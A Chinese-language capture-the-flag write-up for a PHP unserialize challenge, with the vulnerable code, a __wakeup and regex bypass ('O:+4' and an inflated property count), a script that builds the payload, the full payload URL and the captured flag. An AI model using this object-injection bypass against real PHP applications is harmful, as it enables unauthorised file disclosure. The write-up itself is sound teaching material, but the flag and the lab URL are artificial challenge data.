## Web_php_unserialize
```
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true);     //  输出flag
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php   
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```

-----

### 绕过wakeup 绕过正则

#### 绕过wakeup
要绕过wake up 函数:是在反序列化(unserialize)操作中起作用;
* 绕过：对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么i就调用__wakeup()函数 ,不一致就ok了；

#### 绕过正则

正则表达式模式[oc]:\d+:的含义如下：
* / 和最后的 /i：这两个斜杠是正则表达式的定界符，而末尾的 i 是一个修饰符，表示进行不区分大小写的匹配。
* [oc]：匹配字符o或c。
* :：匹配冒号字符。
* \d+：匹配一个或多个数字。
* :：匹配冒号字符。


这个正则表达式会匹配以 o: 或 c: 开头，后跟一个或多个数字，再后跟一个冒号的字符串，并且匹配是不区分大小写的。例如，它会匹配 "o:123:"、"c:45678:"、"O:987:" 等字符串。


2.要绕过正则表达式模式preg_match('/[oc]:\d+:/i', $var)：

这里为什么过滤的是：‘o：数字’和‘c：数字’呢而且不区分大小写；因为serialize() 的参数为 object ， 参数类型有对象 " O " ， 序列化字符串的格式为 参数格式:参数名长度 ， " O:4 "  字符串会被过滤；


* 绕过：改为‘O:+4’  ：str_replace('O:4', 'O:+4',$C)     代替函数，冲字符串y中寻找'O:4',并替换；
```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}

// if (isset($_GET['var'])) { 
//     $var = base64_decode($_GET['var']); 
//     if (preg_match('/[oc]:\d+:/i', $var)) { 
//         die('stop hacking!'); 
//     } else {
//         @unserialize($var); 
//     } 
// } else { 
//     highlight_file("index.php"); 
// } 

$a = new Demo('fl4g.php');
$b = serialize($a);
var_dump($b);
echo '</br>';
var_dump(base64_encode($b));
echo '</br>';
// O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
// O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
$x = 'O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}';
// O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}

$c = str_replace('O:4','O:+4',$b);
$d = str_replace(':1:',':2:',$c);

var_dump(base64_encode($d));
echo '</br>';
var_dump($x);
echo '</br>';
var_dump($d);
echo '</br>';
var_dump($x==$d);
?>
```

### payload
http://61.147.171.105:61295/?var=%22TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==%22

### flag
<?php
$flag="ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}";
?>